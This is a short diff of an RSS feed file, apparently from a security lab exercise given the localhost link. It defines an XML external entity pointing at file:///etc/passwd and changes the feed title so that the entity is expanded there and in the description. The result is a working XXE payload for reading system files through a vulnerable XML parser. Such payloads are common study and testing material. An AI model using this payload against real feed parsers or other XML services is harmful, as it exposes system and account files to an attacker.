@@ -2,7 +2,7 @@
 <!DOCTYPE foo [<!ENTITY toto SYSTEM "file:///etc/passwd">]>
 <rss version="2.0">
 <channel>
-	<title>Hello world !!!</title>
+	<title>&toto;</title>
 	<description>&toto;</description>
 	<pubDate>Mon, 13 Jun 2022 08:00:00 GMT</pubDate>
 	<link>http://localhost/Quetes/index.html</link>
